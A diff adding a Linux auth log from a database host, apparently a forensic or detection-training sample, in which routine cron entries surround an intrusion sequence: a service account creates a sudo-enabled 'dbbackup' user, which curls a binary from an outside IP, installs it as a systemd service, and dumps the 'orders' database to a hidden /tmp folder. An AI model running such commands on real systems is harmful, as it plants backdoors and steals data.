@@ -1,0 +1,86 @@
+Oct 21 00:00:01 lnx-db01 CRON[31392]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 21 00:00:03 lnx-db01 CRON[31392]: pam_unix(cron:session): session closed for user root
+Oct 21 00:15:01 lnx-db01 CRON[31419]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 21 00:15:03 lnx-db01 CRON[31419]: pam_unix(cron:session): session closed for user root
+Oct 21 00:30:01 lnx-db01 CRON[31442]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 21 00:30:02 lnx-db01 CRON[31442]: pam_unix(cron:session): session closed for user root
+Oct 21 00:45:01 lnx-db01 CRON[31446]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 21 00:45:03 lnx-db01 CRON[31446]: pam_unix(cron:session): session closed for user root
+Oct 21 00:48:30 lnx-db01 sshd[31789]: Accepted publickey for deploy from 10.10.1.50 port 56715 ssh2: ED25519 SHA256:Kq3v9GmXcY0Rr2Wq0d7cHnV4Q1mP8sT6uJb5fLxZ2aE
+Oct 21 00:48:30 lnx-db01 sshd[31789]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Oct 21 00:51:02 lnx-db01 sshd[31789]: pam_unix(sshd:session): session closed for user deploy
+Oct 21 01:00:01 lnx-db01 CRON[31483]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 21 01:00:03 lnx-db01 sshd[31815]: Accepted publickey for svc_sync from 10.10.2.11 port 58730 ssh2: ED25519 SHA256:rRa5g7NnaeaSN8Xgnk3SPdxgxwsCYqZaIBRBbWAEdzv
+Oct 21 01:00:03 lnx-db01 sshd[31815]: pam_unix(sshd:session): session opened for user svc_sync(uid=1005) by (uid=0)
+Oct 21 01:00:03 lnx-db01 CRON[31483]: pam_unix(cron:session): session closed for user root
+Oct 21 01:00:04 lnx-db01 sudo: svc_sync : TTY=unknown ; PWD=/home/svc_sync ; USER=root ; COMMAND=/usr/local/bin/export_catalog.sh
+Oct 21 01:00:04 lnx-db01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by svc_sync(uid=1005)
+Oct 21 01:00:45 lnx-db01 sudo: pam_unix(sudo:session): session closed for user root
+Oct 21 01:00:47 lnx-db01 sshd[31815]: pam_unix(sshd:session): session closed for user svc_sync
+Oct 21 01:15:01 lnx-db01 CRON[31489]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 21 01:15:02 lnx-db01 CRON[31489]: pam_unix(cron:session): session closed for user root
+Oct 21 01:30:01 lnx-db01 CRON[31515]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 21 01:30:03 lnx-db01 CRON[31515]: pam_unix(cron:session): session closed for user root
+Oct 21 01:45:01 lnx-db01 CRON[31544]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 21 01:45:02 lnx-db01 CRON[31544]: pam_unix(cron:session): session closed for user root
+Oct 21 02:00:01 lnx-db01 CRON[31557]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 21 02:00:03 lnx-db01 CRON[31557]: pam_unix(cron:session): session closed for user root
+Oct 21 02:12:31 lnx-db01 sshd[32618]: Accepted publickey for svc_sync from 10.10.2.11 port 42143 ssh2: ED25519 SHA256:rRa5g7NnaeaSN8Xgnk3SPdxgxwsCYqZaIBRBbWAEdzv
+Oct 21 02:12:31 lnx-db01 sshd[32618]: pam_unix(sshd:session): session opened for user svc_sync(uid=1005) by (uid=0)
+Oct 21 02:13:05 lnx-db01 sudo: svc_sync : TTY=pts/0 ; PWD=/home/svc_sync ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash dbbackup
+Oct 21 02:13:05 lnx-db01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by svc_sync(uid=1005)
+Oct 21 02:13:05 lnx-db01 useradd[32645]: new group: name=dbbackup, GID=1007
+Oct 21 02:13:05 lnx-db01 useradd[32645]: new user: name=dbbackup, UID=1007, GID=1007, home=/home/dbbackup, shell=/bin/bash, from=/dev/pts/0
+Oct 21 02:13:05 lnx-db01 sudo: pam_unix(sudo:session): session closed for user root
+Oct 21 02:13:22 lnx-db01 sudo: svc_sync : TTY=pts/0 ; PWD=/home/svc_sync ; USER=root ; COMMAND=/usr/bin/passwd dbbackup
+Oct 21 02:13:22 lnx-db01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by svc_sync(uid=1005)
+Oct 21 02:13:29 lnx-db01 passwd[32678]: pam_unix(passwd:chauthtok): password changed for dbbackup
+Oct 21 02:13:29 lnx-db01 sudo: pam_unix(sudo:session): session closed for user root
+Oct 21 02:13:41 lnx-db01 sudo: svc_sync : TTY=pts/0 ; PWD=/home/svc_sync ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo dbbackup
+Oct 21 02:13:41 lnx-db01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by svc_sync(uid=1005)
+Oct 21 02:13:41 lnx-db01 usermod[32684]: add 'dbbackup' to group 'sudo'
+Oct 21 02:13:41 lnx-db01 usermod[32684]: add 'dbbackup' to shadow group 'sudo'
+Oct 21 02:13:41 lnx-db01 sudo: pam_unix(sudo:session): session closed for user root
+Oct 21 02:14:02 lnx-db01 su[32720]: (to dbbackup) svc_sync on pts/0
+Oct 21 02:14:02 lnx-db01 su[32720]: pam_unix(su-l:session): session opened for user dbbackup(uid=1007) by svc_sync(uid=1005)
+Oct 21 02:15:01 lnx-db01 CRON[31589]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 21 02:15:03 lnx-db01 CRON[31589]: pam_unix(cron:session): session closed for user root
+Oct 21 02:15:18 lnx-db01 sudo: dbbackup : TTY=pts/0 ; PWD=/home/dbbackup ; USER=root ; COMMAND=/usr/bin/curl -s -o /usr/local/bin/dbmon http://198.51.100.61/dbmon
+Oct 21 02:15:18 lnx-db01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by dbbackup(uid=1007)
+Oct 21 02:15:19 lnx-db01 sudo: pam_unix(sudo:session): session closed for user root
+Oct 21 02:15:40 lnx-db01 sudo: dbbackup : TTY=pts/0 ; PWD=/home/dbbackup ; USER=root ; COMMAND=/usr/bin/chmod 755 /usr/local/bin/dbmon
+Oct 21 02:15:40 lnx-db01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by dbbackup(uid=1007)
+Oct 21 02:15:40 lnx-db01 sudo: pam_unix(sudo:session): session closed for user root
+Oct 21 02:16:09 lnx-db01 sudo: dbbackup : TTY=pts/0 ; PWD=/home/dbbackup ; USER=root ; COMMAND=/usr/bin/systemctl enable --now dbmon.service
+Oct 21 02:16:09 lnx-db01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by dbbackup(uid=1007)
+Oct 21 02:16:09 lnx-db01 sudo: pam_unix(sudo:session): session closed for user root
+Oct 21 02:18:30 lnx-db01 sudo: dbbackup : TTY=pts/0 ; PWD=/tmp ; USER=postgres ; COMMAND=/usr/bin/pg_dump -d orders -Z 9 -f /tmp/.cache/o.sql.gz
+Oct 21 02:18:30 lnx-db01 sudo: pam_unix(sudo:session): session opened for user postgres(uid=113) by dbbackup(uid=1007)
+Oct 21 02:19:08 lnx-db01 sudo: pam_unix(sudo:session): session closed for user postgres
+Oct 21 02:20:01 lnx-db01 CRON[32760]: pam_unix(cron:session): session opened for user dbbackup(uid=1007) by (uid=0)
+Oct 21 02:20:02 lnx-db01 CRON[32760]: pam_unix(cron:session): session closed for user dbbackup
+Oct 21 02:20:14 lnx-db01 sshd[32838]: Accepted publickey for svc_sync from 10.10.2.11 port 40372 ssh2: ED25519 SHA256:rRa5g7NnaeaSN8Xgnk3SPdxgxwsCYqZaIBRBbWAEdzv
+Oct 21 02:20:14 lnx-db01 sshd[32838]: pam_unix(sshd:session): session opened for user svc_sync(uid=1005) by (uid=0)
+Oct 21 02:20:21 lnx-db01 sshd[32838]: pam_unix(sshd:session): session closed for user svc_sync
+Oct 21 02:25:01 lnx-db01 CRON[32768]: pam_unix(cron:session): session opened for user dbbackup(uid=1007) by (uid=0)
+Oct 21 02:25:02 lnx-db01 CRON[32768]: pam_unix(cron:session): session closed for user dbbackup
+Oct 21 02:30:01 lnx-db01 CRON[32785]: pam_unix(cron:session): session opened for user dbbackup(uid=1007) by (uid=0)
+Oct 21 02:30:01 lnx-db01 CRON[31627]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 21 02:30:02 lnx-db01 CRON[32785]: pam_unix(cron:session): session closed for user dbbackup
+Oct 21 02:30:03 lnx-db01 CRON[31627]: pam_unix(cron:session): session closed for user root
+Oct 21 02:31:09 lnx-db01 su[32720]: pam_unix(su-l:session): session closed for user dbbackup
+Oct 21 02:31:12 lnx-db01 sshd[32618]: pam_unix(sshd:session): session closed for user svc_sync
+Oct 21 02:35:01 lnx-db01 CRON[32797]: pam_unix(cron:session): session opened for user dbbackup(uid=1007) by (uid=0)
+Oct 21 02:35:02 lnx-db01 CRON[32797]: pam_unix(cron:session): session closed for user dbbackup
+Oct 21 02:40:01 lnx-db01 CRON[32827]: pam_unix(cron:session): session opened for user dbbackup(uid=1007) by (uid=0)
+Oct 21 02:40:02 lnx-db01 CRON[32827]: pam_unix(cron:session): session closed for user dbbackup
+Oct 21 02:45:01 lnx-db01 CRON[31640]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 21 02:45:03 lnx-db01 CRON[31640]: pam_unix(cron:session): session closed for user root
+Oct 21 03:00:01 lnx-db01 CRON[31650]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 21 03:00:02 lnx-db01 CRON[31650]: pam_unix(cron:session): session closed for user root
+Oct 21 03:15:01 lnx-db01 CRON[31667]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 21 03:15:02 lnx-db01 CRON[31667]: pam_unix(cron:session): session closed for user root
+Oct 21 03:30:01 lnx-db01 CRON[31705]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 21 03:30:02 lnx-db01 CRON[31705]: pam_unix(cron:session): session closed for user root
+Oct 21 03:45:01 lnx-db01 CRON[31714]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 21 03:45:02 lnx-db01 CRON[31714]: pam_unix(cron:session): session closed for user root
